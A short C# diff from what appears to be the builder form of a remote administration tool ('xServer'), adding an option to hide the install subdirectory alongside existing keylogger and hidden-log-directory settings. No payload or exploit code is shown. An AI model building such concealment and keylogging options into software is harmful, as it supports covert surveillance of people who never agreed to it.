@@ -264,6 +264,7 @@ namespace xServer.Forms
             options.Keylogger = chkKeylogger.Checked;
             options.LogDirectoryName = txtLogDirectoryName.Text;
             options.HideLogDirectory = chkHideLogDirectory.Checked;
+            options.HideInstallSubdirectory = chkHideSubdirectory.Checked;
 
             if (options.Password.Length < 3)
             {
